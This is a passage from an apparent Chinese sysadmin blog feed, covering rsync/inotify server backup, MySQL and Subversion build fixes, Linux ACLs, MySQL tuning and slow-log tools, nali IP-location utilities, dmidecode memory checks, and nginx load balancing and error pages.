<p>地址rsync://lixiphp@203.171.237.245/test，lixiphp为服务器A用户，203.171.237.245服务器A IP地址或者域名 test为服务器A配置模块</p>
<p>密码存放在/home/admin/admin_backups/password.rsync，这里存放位置，可自由安排。</p>
<p>password.rsync内容格式为： password</p>
<blockquote>
<p>rsyncofpass  </p>
</blockquote>
<p>设置权限为只读：</p>
<blockquote>
<p>chmod 600 /home/admin/admin_backups/password.rsync  </p>
</blockquote>
<h6 id="解决错误"><a href="#解决错误" class="headerlink" title="解决错误"></a>解决错误</h6><p><strong>用户密码错误</strong></p>
<blockquote>
<p>@ERROR: auth failed on module test<br>rsync error: error starting client-server protocol (code 5) at main.c(1503) [receiver=3.0.6]  </p>
</blockquote>
<p>检查服务器A存储密码文件和服务器B密码文件。</p>
<ul>
<li>服务器A密码文件 /etc/rsyncd.secrets 格式为： username:password*   服务器B密码文件 password.rsync 格式为：password  </li>
</ul>
<p><strong>文件权限错误</strong></p>
<blockquote>
<p>password file must not be other-accessible<br>continuing without password file<br>Password:<br>@ERROR: auth failed on module <em>*</em><br>rsync error: error starting client-server protocol (code 5) at main.c(1503) [receiver=3.0.6]  </p>
</blockquote>
<p>检查服务器A存储密码文件和服务器B密码文件。</p>
<ul>
<li>服务器A密码文件 /etc/rsyncd.secrets 权限为600： chmod 600 /etc/rsyncd.secrets*   服务器B密码文件 password.rsync 权限为600：chmod 600 password.rsync  </li>
</ul>
<h6 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h6><blockquote>
<p>[root@hk admin_backups]# vi backup.sh  </p>
</blockquote>
<p>内容如下：</p>
<blockquote>
<p>#/bin/sh<br>rsync -vzrtopg –progress –delete –password-rsyncfile=/home/admin/admin_backups/password.rsync ://lixiphp@203.171.237.245/test&#160; /home/admin/admin_backups/test  </p>
</blockquote>
<p>添加定时任务：</p>
<blockquote>
<p>[root@hk admin_backups]# crontab –e  </p>
</blockquote>
<p>添加以下内容：</p>
<blockquote>
<p><em>/1 </em> <em> </em> * /home/admin/admin_backups/backup.sh &gt; /dev/null 2&gt;&amp;1  </p>
</blockquote>
<p>每个一分钟从服务器A同步到服务器B！</p>
<h6 id="服务器B向下备份到服务器A"><a href="#服务器B向下备份到服务器A" class="headerlink" title="服务器B向下备份到服务器A"></a>服务器B向下备份到服务器A</h6><blockquote>
<p>rsync -vzrtopg –progress –delete –password-file=/home/admin/admin_backups/password.rsync&#160; /home/admin/admin_backups/test rsync://lixiphp@203.171.237.245/test  </p>
</blockquote>
<p>请确保服务器A同步用户lixiphp，对模块test所在目录有读、写、执行的权限</p>
<p>&#160;</p>
<p><strong>补充：rsync+inotify 实时同步</strong></p>
<p>A服务器实时同步到B服务器做法：</p>
<p>B服务器部署rsync服务端，B服务器配置rsync客户端和编译安装inotify</p>
<p>实时同步原理：</p>
<p>inotify监测和同步脚本：</p>
<blockquote>
<p>#!/bin/bash<br>host=192.168.1.1</p>
<p>src=/wwwroot/www/jythonscript/<br>dst=jythonscript<br>user=rsync<br>/usr/local/bin/inotifywait -mrq –timefmt ‘%d/%m/%y %H:%M’ –format ‘%T %w%f%e’ -e modify,delete,create,attrib&#160; $src<br>| while read files<br>&#160;&#160;&#160;&#160;&#160;&#160; do<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; /usr/local/bin/rsync -vzrtopg –delete –progress&#160; $src&#160; $user@$host::$dst&#160;&#160;&#160;&#160; –password-file=/etc/rsyncd.password<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; echo &quot;${files} was rsynced&quot; &gt;&gt;/tmp/rsync.log 2&gt;&amp;1<br>&#160;&#160;&#160;&#160;&#160;&#160; done  </p>
</blockquote>
<p>&#160;</p>
<p>inotifywait监测文件是否发生变化，如果有变化就执行rsync，同步相应的文件！</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Cmake编译mysql出错Could NOT find Curses  (missing:  CURSES_LIBRARY CURSES_INCLUDE_PATH)]]></title>
      <url>/2012/08/07/cmake-e7-bc-96-e8-af-91mysql-e5-87-ba-e9-94-99could-not-find-curses-missing-curses-library-curses-include-path.html</url>
      <content type="html"><![CDATA[<p><strong>问题描述:</strong></p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; 利用Cmake 编译mysql-5.5.8版本时，出现</p>
<p>– Could NOT find Curses&#160; (missing:&#160; CURSES_LIBRARY CURSES_INCLUDE_PATH)<br>CMake Error at cmake/readline.cmake:82 (MESSAGE):<br>&#160; Curses library not found.&#160; Please install appropriate package,</p>
<p>错误</p>
<p>&#160;</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2012/08/image1.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2012/08/image_thumb1.png" alt="image" title="image"></a></p>
<p>&#160;</p>
<p><strong>解决方法：</strong></p>
<p>显示缺少libcurse library,建议安装libncurses5-dev包</p>
<p>yum –y install libncures5-*</p>
<p>如果存在，find /&#160; -name libncurses*</p>
<p>cmake . -DCURSES_LIBRARY=/usr/lib/libncurses.so -DCURSES_INCLUDE_PATH=/usr/include即可解决</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[虚拟主机用户ftp和apache用户文件互操作权限解决方法]]></title>
      <url>/2012/08/06/e8-99-9a-e6-8b-9f-e4-b8-bb-e6-9c-ba-e7-94-a8-e6-88-b7ftp-e5-92-8capache-e7-94-a8-e6-88-b7-e6-96-87-e4-bb-b6-e4-ba-92-e6-93-8d-e4-bd-9c-e6-9d-83-e9-99-90-e8-a7-a3-e5-86-b3-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p><strong>方法1.用户组控制方法</strong><br> **   </p>
<p> 先给所有的虚拟主机主机中的虚拟用户(ftp用户)加入到apache这个组.然后设置umask为002.这样用户和组都有读写执行权限。这个是比较容易的方法.但不安全。不同的用户可以删除对方的文件，因为是同一个组,组有读写执行的权限.**  </p>
<p><strong>方法2.使用linux高级的权限管理acl     
</strong>对一个目录设置二重权限，除了用户本身的用户组,在加入apache对他要读写执行的权限.<br>这样用户就能删除apache生成的文件.但为别人的组，别的虚拟用户他没法删除.<br>下面我们就来看看第二种的控制方法<br>linux系统里面，并不是只能为所有者，同组用户和其他用户这三类人分配一个文件（目录）的权限，你还可以指定其他的用户或者组，不过有个前提，挂载分区的时候加上acl选项，比如：<br>mount /dev/hda1 /home -o acl。<br>然后你可以使用<br>setfacl -m u:ftp:rwx /home/ftp/www<br>命令来给ftp用户分配/home/ftp/www目录的所有权限<br>如果你要/home/ftp/www/下面新建的目录和文件也有同样的权限<br>setfacl -d -m u:ftp:rwx /home/ftp/www<br>设置默认的权限，这个命令还可以实现多个用户的不同权限的控制，比如<br>setfacl -m u:ftp:rwx /home/www；<br>setfacl -m u:tmp:r-x /home/www；<br>ftp用户拥有所有权限，tmp用户拥有只读权限。<br>你还可以设置mask的值：<br>setfacl -m m::rwx /home/www；<br>这样，新建的你就可以让虚拟主机的用户和apache用户都有权限操作文件和目录了，比如apache用户的用户名是apache，虚拟主机的用户名是vmuser，目录是/home/vmuser/www，可以使用以下的命令：<br>setfacl -m u:vmuser:rwx /home/vmuser/www；<br>setfacl -m u:apache:rwx /home/vmuser/www；<br>setfacl -d -m u:vmuser:rwx /home/vmuser/www；<br>setfacl -d -m u:apache:rwx /home/vmuser/www；<br>setfacl -m m::rwx /home/vmuser/www；<br>setfacl -d -m m::rwx /home/vmuser/www；</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[在编译subversion-1.7.2出现库文件找不到错误解决]]></title>
      <url>/2012/08/04/e5-9c-a8-e7-bc-96-e8-af-91subversion-1-7-2-e5-87-ba-e7-8e-b0-e5-ba-93-e6-96-87-e4-bb-b6-e6-89-be-e4-b8-8d-e5-88-b0-e9-94-99-e8-af-af-e8-a7-a3-e5-86-b3.html</url>
      <content type="html"><![CDATA[<p>问题描述：</p>
<p>./configure时没有出现异常警告，当make编译时出现：</p>
<p>/usr/bin/ld: cannot find -luuid</p>
<p>collect2: ld returned 1 exit status<br>make: <em>*</em> [subversion/libsvn_ra_dav/libsvn_ra_dav-1.la] Error 1</p>
<p>&#160;</p>
<p>解决方法：</p>
<p>ln –s&#160; /lib64/libuuid.so.1&#160; /lib/libuuid.so.1 </p>
<p>ln -s /lib64/libuuid.so.1&#160; /lib/libuuid.so</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL 优化工具 MySQLTuner]]></title>
      <url>/2012/08/03/mysql-e4-bc-98-e5-8c-96-e5-b7-a5-e5-85-b7-mysqltuner.html</url>
      <content type="html"><![CDATA[<p>MySQLTuner 下载地址：<a href="http://github.com/rackerhacker/MySQLTuner-perl" target="_blank" rel="external">http://github.com/rackerhacker/MySQLTuner-perl</a></p>
<p>MySQLTuner 使用方法：<br>Downloading and using MySQLTuner is actually a very simple process:</p>
<p>&#160;</p>
<p>wget mysqltuner.pl<br>perl mysqltuner.pl</p>
<p>&#160;</p>
<p>If you’d rather not invoke perl every time, just make it executable:</p>
<p>chmod u+x mysqltuner.pl<br>./mysqltuner.pl</p>
<p>» Latest development version<br>If you want to get the bleeding edge commits, you can check out the latest code with git:</p>
<p>git clone git://github.com/rackerhacker/MySQLTuner-perl.git</p>
<p>看看我的运行结果</p>
<blockquote>
<p>&gt;&gt; MySQLTuner 1.1.1 - Major Hayden<br>&gt;&gt; Bug reports, feature requests, and downloads at <a href="http://mysqltuner.com/" target="_blank" rel="external">http://mysqltuner.com/</a><br>&gt;&gt; Run with ‘–help’ for additional options and output filtering</p>
<p>——– General Statistics ————————————————–<br>[–] Skipped version check for MySQLTuner script<br>[OK] Currently running supported MySQL version 5.1.43-log<br>[OK] Operating on 64-bit architecture</p>
<p>——– Storage Engine Statistics ——————————————-<br>[–] Status: -Archive -BDB -Federated -InnoDB -ISAM -NDBCluster<br>[–] Data in MyISAM tables: 889M (Tables: 479)<br>[–] Data in MEMORY tables: 1M (Tables: 4)<br>[!!] Total fragmented tables: 29</p>
<p>——– Security Recommendations ——————————————-<br>[OK] All database users have passwords assigned</p>
<p>——– Performance Metrics ————————————————-<br>[–] Up for: 12h 55m 27s (4M q [105.230 qps], 295K conn, TX: 9B, RX: 546M)<br>[–] Reads / Writes: 82% / 18%<br>[–] Total buffers: 432.0M global + 6.3M per thread (500 max threads)<br>[!!] Maximum possible memory usage: 3.5G (175% of installed RAM)<br>[OK] Slow queries: 0% (48K/4M)<br>[OK] Highest usage of available connections: 3% (16/500)<br>[OK] Key buffer size / total MyISAM indexes: 384.0M/332.6M<br>[OK] Key buffer hit rate: 100.0% (2B cached / 205K reads)<br>[OK] Query cache efficiency: 49.3% (1M cached / 3M selects)<br>[!!] Query cache prunes per day: 268042<br>[OK] Sorts requiring temporary tables: 0% (10 temp sorts / 122K sorts)<br>[OK] Temporary tables created on disk: 19% (4K on disk / 22K total)<br>[OK] Thread cache hit rate: 99% (16 created / 295K connections)<br>[!!] Table cache hit rate: 18% (256 open / 1K opened)<br>[OK] Open file limit used: 19% (497/2K)<br>[!!] Table locks acquired immediately: 88%</p>
<p>——– Recommendations —————————————————–<br>General recommendations:<br>Run OPTIMIZE TABLE to defragment tables for better performance<br>MySQL started within last 24 hours - recommendations may be inaccurate<br>Reduce your overall MySQL memory footprint for system stability<br>Increase table_cache gradually to avoid file descriptor limits<br>Optimize queries and/or use InnoDB to reduce lock wait<br>Variables to adjust:<br><strong><em> MySQL’s maximum memory usage is dangerously high </em></strong><br><strong><em> Add RAM before increasing MySQL buffer variables </em></strong><br><strong>query_cache_size (&gt; 32M)<br>table_cache (&gt; 256)</strong></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysqltuner </tag>
            
            <tag> mysql优化工具 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 显示IP地理位置 qqwry系列小工具]]></title>
      <url>/2012/08/03/linux-e6-98-be-e7-a4-baip-e5-9c-b0-e7-90-86-e4-bd-8d-e7-bd-ae-qqwry-e7-b3-bb-e5-88-97-e5-b0-8f-e5-b7-a5-e5-85-b7.html</url>
      <content type="html"><![CDATA[<p>围绕纯真数据库的一系列小工具</p>
<ul>
<li>qqwry.c，qqwry.h。一个c实现的lib,用来从纯真数据库里获取ip地址信息。<a href="http://code.google.com/p/qqwry/source/browse/#svn/trunk/libqqwry" target="_blank" rel="external">下载</a>，<a href="http://code.google.com/p/qqwry/source/browse/trunk/libqqwry/qqwry.h" target="_blank" rel="external">文档</a></li>
<li>nali，一组ip查询工具，包括可以让dig，traceroute显示ip地理信息。<a href="http://qqwry.googlecode.com/files/nali-0.1.tar.gz" target="_blank" rel="external">下载</a>，<a href="http://www.surfchen.org/wiki/Nali" target="_blank" rel="external">文档</a></li>
<li>pecl::qqwry，纯真数据库查询的PHP C扩展实现。<a href="http://pecl.php.net/package/qqwry" target="_blank" rel="external">下载</a>，<a href="http://www.surfchen.org/wiki/QQWry" target="_blank" rel="external">文档</a></li>
<li>纯真数据库UTF-8版本。转换工具也以开源形式发布，用php实现  </li>
</ul>
<p>nali，名字取自中文“哪里”的拼音。nali包含一组命令行程序，其主要功能就是把一些网络工具的输出的IP字符串，附加上地理位置信息 (使用纯真数据库)。例如218.65.137.1会变成218.65.137.1[广西南宁市 电信]。查询是在本地进行，并不会进行联网查询，所以效率方面不会有什么影响。<br>目前包含以下几个命令：</p>
<p><strong>nali<br>nali-dig<br>nali-nslookup<br>nali-traceroute<br>nali-tracepath<br>nali-ping</strong></p>
<p>使用这些命令的前提是，他们对应的命令必须存在。例如你要用nali-dig，必须保证dig是存在的。他们的用法和原始命令是一样的。例如nali-dig，用法就和dig一样。<br>大家可能注意到了nali这个命令，它可以对标准输出的IP串附加上地理信息。nali-*系列工具都是基于这个来实现的。</p>
<p>&#160;</p>
<p>wget <a href="http://qqwry.googlecode.com/files/nali-0.1.tar.gz" target="_blank" rel="external">http://qqwry.googlecode.com/files/nali-0.1.tar.gz</a>&#160; </p>
<p>./configure &amp;&amp; make &amp;&amp; make install</p>
<p><strong>使用：</strong><br>1、统计apache的访问记录（可以统计哪个ip的访问量最多，并查看是来自哪里的）：<br>命令：</p>
<p>cat /data/log/log_all | awk ‘{print $1}’ | sort | uniq -c | nali | sort -rnk1 | more</p>
<p>输出结果：</p>
<p>2303 203.208.60.43[北京市 谷歌(中国)公司]<br>1442 61.135.249.210[北京市 联通ADSL]<br>827 124.207.205.1[北京市 电信通]<br>607 121.14.53.65[广东省江门市 电信]<br>493 117.63.249.59[江苏省常州市 电信]<br>289 203.208.60.5[北京市 谷歌(中国)公司]<br>272 203.208.60.47[北京市 谷歌(中国)公司]<br>252 173.66.232.6[北美地区]<br>240 61.185.198.110[陕西省西安市 电信ADSL]<br>217 123.127.8.36[北京市 联通ADSL]<br>217 113.233.255.7[辽宁省 联通]<br>206 222.76.18.181[福建省福州市 电信ADSL]<br>196 72.30.81.190[美国 yahoo蜘蛛]</p>
<p>&#160;</p>
<p>2、使用nali-ping：<br>命令：nali-ping www.baidu.com</p>
<p>输出结果：</p>
<p>输出结果：<br><a href="http://www.21andy.com/blog/upload/2010/0925/d3493bb1dbc423af.gif" target="_blank" rel="external"><img src="http://www.21andy.com/blog/upload/2010/0925/d3493bb1dbc423af_thumb.gif" alt="Linux 显示IP地理位置 qqwry系列小工具 d3493bb1dbc423af thumb" title="Linux 显示IP地理位置 qqwry系列小工具"></a><br>也就是说，nali这个命令，可以对标准输出的ip，附加上地理信息。同理，如果你不喜欢用nali-dig，那么也可以用dig ip|nali这样的命令。<br>如果你觉得输入nali-xxx麻烦，那么可以做一些alias，例如：</p>
<p>alias traceroute=’nali-traceroute’<br>alias dig=’nali-dig’</p>
<p>3、结合mtr使用nali</p>
<h1 id="mtr-210-51-163-180-nali"><a href="#mtr-210-51-163-180-nali" class="headerlink" title="mtr 210.51.163.180 | nali"></a>mtr 210.51.163.180 | nali</h1><p><a href="http://www.21andy.com/blog/upload/2010/0925/5b7ff1edf3dbb3b9.png" target="_blank" rel="external"><img src="http://www.21andy.com/blog/upload/2010/0925/5b7ff1edf3dbb3b9_thumb.png" alt="Linux 显示IP地理位置 qqwry系列小工具 5b7ff1edf3dbb3b9 thumb" title="Linux 显示IP地理位置 qqwry系列小工具"></a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 查看内存插槽数、最大容量和频率]]></title>
      <url>/2012/08/02/linux-e6-9f-a5-e7-9c-8b-e5-86-85-e5-ad-98-e6-8f-92-e6-a7-bd-e6-95-b0-e3-80-81-e6-9c-80-e5-a4-a7-e5-ae-b9-e9-87-8f-e5-92-8c-e9-a2-91-e7-8e-87.html</url>
      <content type="html"><![CDATA[<p>我们通过free命令查看机器空闲内存时，会发现free的值很小。这主要是因为，在linux中有这么一种思想，内存不用白不用，因此它尽可能的cache 和buffer一些数据，下面是查看内存的命令供大家参考</p>
<p><strong>1.Linux 查看内存的插槽数,已经使用多少插槽.每条内存多大，已使用内存多大</strong></p>
<p>dmidecode|grep  -P  -A5  “Memorys+Device”|grep Size|grep -v Range<br>Size:2048MB<br>Size:2048MB<br>Size:NoModuleInstalled<br>Size:NoModuleInstalled<br>Size:NoModuleInstalled<br>Size:NoModuleInstalled<br>Size:NoModuleInstalled<br>Size:NoModuleInstalled </p>
<p><strong>2.Linux 查看内存支持的最大内存容量</strong></p>
<p>dmidecode|grep -P  ‘Maximums+Capacity’<br>MaximumCapacity:64GB </p>
<p><strong>3.Linux 查看内存的频率</strong></p>
<p>dmidecode|grep -A16 “MemoryDevice”<br>dmidecode|grep -A16 “MemoryDevice”|grep ‘Speed’<br>Speed:667MHz(1.5ns)<br>Speed:667MHz(1.5ns)<br>Speed:667MHz(1.5ns)<br>Speed:667MHz(1.5ns)<br>Speed:667MHz(1.5ns)<br>Speed:667MHz(1.5ns)<br>Speed:667MHz(1.5ns)<br>Speed:667MHz(1.5ns)</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql慢日志分析工具之mysqlsla学习笔记]]></title>
      <url>/2012/07/29/mysql-e6-85-a2-e6-97-a5-e5-bf-97-e5-88-86-e6-9e-90-e5-b7-a5-e5-85-b7-e4-b9-8bmysqlsla-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0.html</url>
      <content type="html"><![CDATA[<p>一：安装<br> shell&gt; wget <a href="http://hackmysql.com/scripts/mysqlsla-2.03.tar.gz" target="_blank" rel="external">http://hackmysql.com/scripts/mysqlsla-2.03.tar.gz</a><br> shell&gt; tar zvxf mysqlsla-2.03.tar.gz<br> shell&gt; cd mysqlsla-2.03<br> shell&gt; perl Makefile.PL<br> shell&gt; make<br> shell&gt; make install<br> shell&gt; mysqlsla /data/mysql/slow.log   </p>
<h1 id="mysqlsla会自动判断日志类型，为了方便可以建立一个配置文件“-mysqlsla”-在文件里写上：top-100，这样会打印出前100条结果。"><a href="#mysqlsla会自动判断日志类型，为了方便可以建立一个配置文件“-mysqlsla”-在文件里写上：top-100，这样会打印出前100条结果。" class="headerlink" title="mysqlsla会自动判断日志类型，为了方便可以建立一个配置文件“~/.mysqlsla” ,在文件里写上：top=100，这样会打印出前100条结果。"></a>mysqlsla会自动判断日志类型，为了方便可以建立一个配置文件“~/.mysqlsla” ,在文件里写上：top=100，这样会打印出前100条结果。</h1><p> 【统计参数说明】<br> queries total: 总查询次数<br> unique:去重后的sql数量<br> sorted by : 输出报表的内容排序 最重大的慢sql统计信息, 包括 平均执行时间, 等待锁时间, 结果行的总数, 扫描的行总数.<br> Count: sql的执行次数及占总的slow log数量的百分比.<br> Time: 执行时间, 包括总时间, 平均时间, 最小, 最大时间, 时间占到总慢sql时间的百分比.<br> 95% of Time: 去除最快和最慢的sql, 覆盖率占95%的sql的执行时间.<br> Lock Time: 等待锁的时间.<br> 95% of Lock: 95%的慢sql等待锁时间.<br> Rows sent: 结果行统计数量, 包括平均, 最小, 最大数量.<br> Rows examined: 扫描的行数量.<br> Database: 属于哪个数据库.<br> Users: 哪个用户,IP, 占到所有用户执行的sql百分比.<br> Query abstract: 抽象后的sql语句.<br> Query sample: sql语句.</p>
<p> 二：日志分析<br> 常用参数说明：<br> 1&gt; -log-type (-lt) type logs:<br> 通过这个参数来制定log的类型，主要有slow, general, binary, msl, udl,分析slow log时通过制定为slow.<br> 2&gt; -sort:<br> 制定使用什么参数来对分析结果进行排序，默认是按照t_sum来进行排序。<br> t_sum按总时间排序， c_sum按总次数排序<br> 3&gt; -top:显示sql的数量，默认是10,表示取按规则排序的前多少条<br> 4&gt; –statement-filter (-sf) [+-][TYPE]:<br> 过滤sql语句的类型，比如select、update、drop.<br> [TYPE]有SELECT, CREATE, DROP, UPDATE, INSERT，例如”+SELECT,INSERT”，不出现的默认是-，即不包括。<br> 5&gt; db：要处理哪个库的日志：<br> 基本用法：<br> shell&gt; mysqlsla -lt slow slow.log -sf “+select” -db web -top 100 -sort t_su<br> Count : 2.92k (17.43%) //出现的次数和占所有慢查的比例（按排序规则算） Connection ID : 424 Database : db //哪个数据库的SQL Users : <a href="mailto:cacti@localhost" target="_blank" rel="external">cacti@localhost</a> : 100.00% (2920) of query, 57.46% (9625) of all users //哪个用户产生的SQL EXPLAIN : Not a SELECT statement //如果启用-ex，会产生EXPLAIN。 Query abstract: INSERT INTO table(local_data_id, rrd_name, time, output) VALUES (N, ‘S’, ‘S’, ‘S’) Query sample: insert into table(local_data_id, rrd_name, time, output) values (8, ‘users’, ‘2009-12-10 10:30:01’, ‘1’)</p>
<p> 注意事项：<br> 1.安装工具后，若运行时出现如下提示：# mysqlsla -lt slow slow.log Can’t locate DBI.pm in @INC (@INC contains: /usr/lib/perl5/site_perl/5.8.8/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.8 /usr/lib/perl5/site_perl /usr/lib/perl5/vendor_perl/5.8.8/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.8 /usr/lib/perl5/vendor_perl /usr/lib/perl5/5.8.8/i386-linux-thread-multi /usr/lib/perl5/5.8.8 .) at /usr/local/bin/mysqlsla line 2095.BEGIN failed–compilation aborted at /usr/local/bin/mysqlsla line 2095.原因:在于相关模块没有安装解决办法：shell&gt; perl -MCPAN -e ‘install DBI’<br> 2. 相关错误信息解决方案可以查看：<a href="http://www.517sou.net/Article/mysqlsla.aspx" target="_blank" rel="external">http://www.517sou.net/Article/mysqlsla.aspx</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[再识Nginx负载均衡与健康检查]]></title>
      <url>/2012/07/27/e5-86-8d-e8-af-86nginx-e8-b4-9f-e8-bd-bd-e5-9d-87-e8-a1-a1-e4-b8-8e-e5-81-a5-e5-ba-b7-e6-a3-80-e6-9f-a5.html</url>
      <content type="html"><![CDATA[<p> 在业界，一直流传这样一句话：Nginx抗并发能力强！为什么Nginx抗并发能力强？原因是使用了非阻塞、异步传输<br>阻塞：如apache代理tomcat时，apache开启10个进程，同时处理着10个请求，在tomcat没有返回给apache结果时，apache是不会处理用户发出的第11个请求<br>非阻塞：如nginx代理tomcat时，nginx开启1000个并发，同时处理着1000个请求，在tomcat没有返回给nginx结果时，nginx会依然处理后面用户发给的请求<br>同步传输：比如squid代理tomcat时，浏览器发起请求，然后请求会squid立刻被转到后端服务器，于是在浏览器和后端服务器之间就建立了一个连接。在请求发起到请求完成，这条连接都是一直存在的。<br>异步传输：比如nginx代理tomcat时，浏览器发起请求，请求不会立刻转到后端服务器，而是将请求数据（header）先保存到nginx上，然后nginx再把这个请求发到后端服务器， 后端服务器处理完之后把数据返回到nginx上，nginx将数据流发到浏览器。</p>
<p>昨天 21:19 上传下载附件 (3.47 KB) </p>
<pre><code>如上图所示假设用户执行一个上传文件操作，由于用户网速较慢，因此需要花半个小时才能把文件传到服务器。squid的同步代理在用户开始上传后就和后端tomcat建立了连接，半小时后文件上传结束，所以，后端tomcat服务器连接保持了半个小时；而nginx异步代理就是先将数据保存在nginx上，因此仅仅是nginx和用户 保持了半小时连接，后端服务器在这半小时内没有为这个请求开启连接，半小时后用户上传结束，nginx才将上传内容发到后端tomcat，nginx和后台之间的带宽 是很充裕的，所以只花了一秒钟就将请求发送到了后台，由此可见，后端服务器连接保持了一秒。
</code></pre><p>一、负载均衡<br>1、负载均衡模块（upstream）<br>Upstream模块是Nginx 负载均衡的主要模块，它提供了简单的办法来实现在轮询和客户端IP之间的后端服务器负载均衡,并可以对服务器进行健康检查。upstream并不处理请求，而是通过请求后端服务器得到用户的请求内容。在转发给后端时，默认是轮询，也可以是ip_hash。</p>
<p>Nginx常见负载均衡方式<br>轮询（默认）：按照每个请求时间的顺序的分配到后端服务器<br>ip_hash：每个请求按访问ip的hash结果分配<br>weight：按照权重轮询，权重值越高，轮询几率越大<br>fair（三方）：按后端服务器的响应时间来分配请求，响应时间短的优先分配<br>url_hash（三方）：根据url的hash结果进行分配</p>
<p>下面为一组服务器负载均衡的集合：<br>upstream info_pool {<br>                     ip_hash;<br>                     server 110.4.111.28:8081 max_fails=2 fail_timeout=5s;<br>                     server 110.4.111.29:8081 max_fails=2 fail_timeout=5s;<br>                     server 110.4.111.30:8081 max_fails=2 fail_timeout=5s;<br>                     } </p>
<p>Upstream相关指令解释:<br>max_fails:定义定义可以发生错误的最大次数<br>fail_timeout：nginx在fail_timeout设定的时间内与后端服务器通信失败的次数超过max_fails设定的次数，则认为这个服务器不在起作用；在接下来的 fail_timeout时间内，nginx不再将请求分发给失效的server<br>down：把后端标记为离线，仅限于ip_hash<br>backup：标记后端为备份服务器，若后端服务器全部无效时才启用</p>
<p>upstream中使用ip_hash模式时，为什么weight选项会被忽略？<br>因为ip_hash模式使用的负载均衡算法是根据请求ip进行hash，而weight模式使用的wrr算法，所以不可同时使用</p>
<p>2、代理模块（proxy）<br>    Proxy为Nginx的代理模块，允许负责将用户的HTTP请求转发到后端服务器，同时也可以结合upstream模块，达到负载均衡的目的<br>注：proxy相关功能、指令很多，在此只讲与upstream相关的指令和功能</p>
<p>proxy模块常用指令解释：<br>proxy_pass：指定转发到后端服务器的请求，在location中指定，常用URI类型如下<br>TCP套接字：proxy_pass <a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a>;<br>Unix套接字：proxy_pass <a href="http://unix:/tmp/nginx.sock" target="_blank" rel="external">http://unix:/tmp/nginx.sock</a>;<br>Upstream区段：proxy_pass <a href="http://nginx_pool" target="_blank" rel="external">http://nginx_pool</a>;<br>域名：proxy_pass <a href="http://www.a.com" target="_blank" rel="external">http://www.a.com</a>;</p>
<p>proxy_pass使用域名命名时，为什么不能和server_name相同 ？</p>
<p>昨天 21:21 上传下载附件 (45.12 KB) </p>
<p>如上图所以，其数据访问流如下：<br>①        、用户访问www.a.com，server_name指令监听并接受www.a.com请求内容<br>②        、server_name将www.a.com的请求转交给proxy_pass指令处理<br>③        、proxy_pass接到请求后根据相应URI进行处理（此处URI为www.a.com），因为我们此处URI为域名，所以proxy_pass会请求DNS进行解析<br>④        、proxy_pass收到DNS解析结果（www.a.com），去请求server_name<br>由此可见如果proxy_pass的URI命名若和server_name命名相同，则形成一个请求环路。所以在配置proxy_pass的URI时，应避免和本server内的server_name重名</p>
<p>二、健康检查<br>   Nginx的健康检查主要体现在对后端服务提供健康检查，且功能被集成在upstream模块中，共有两个指令<br>max_fails:定义定义可以发生错误的最大次数<br>fail_timeout：nginx在fail_timeout设定的时间内与后端服务器通信失败的次数超过max_fails设定的次数，则认为这个服务器不在起作用；在接下来的 fail_timeout时间内，nginx不再将请求分发给失效的server。<br>健康检查机制：<br>   Nginx在检测到后端服务器故障后，nginx依然会把请求转向该服务器，当nginx发现timeout或者refused后，会把改请求会分发到upstream的其它节点，直到获得正常数据后，nginx才会把数据返回给用户，这也便体现了nginx的异步传输，而lvs/haproxy/apache责无法做到这些（在lvs/haproxy/apache里，每个请求都只有一次机会，假如用户发起一个请求，结果该请求分到的后端服务器刚好挂掉了，那么这个请求就失败了）</p>
<p>转自luwenju</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[nginx自定义错误页面（补充）]]></title>
      <url>/2012/07/26/nginx-e8-87-aa-e5-ae-9a-e4-b9-89-e9-94-99-e8-af-af-e9-a1-b5-e9-9d-a2-ef-bc-88-e8-a1-a5-e5-85-85-ef-bc-89.html</url>
      <content type="html"><![CDATA[<p>自定义nginx 404错误页面是提高用户体验的一个细节，如果是正规站，我们就必须做好它。你可以对每个网站的错误页面分别设置，也可以设置一个全局的404页面。</p>
<p>为指定位置设定一个404页面</p>
<p>location /my_blog {<br>    error_page    404 = /article_not_found.html;<br>}<br>整个网站的404页面</p>
<p>server {<br>listen 80;<br>    error_page  404  /page_not_found.html;<br>    …<br>你可以用单个错误页面一起来处理多个错误代码</p>
<p>location /my_blog {<br> error_page 500 502 503 504 = /server_error.html<br>}<br>重定向到一个完全不同的服务器，假设你在http区域定义有一个上游服务器server2：</p>
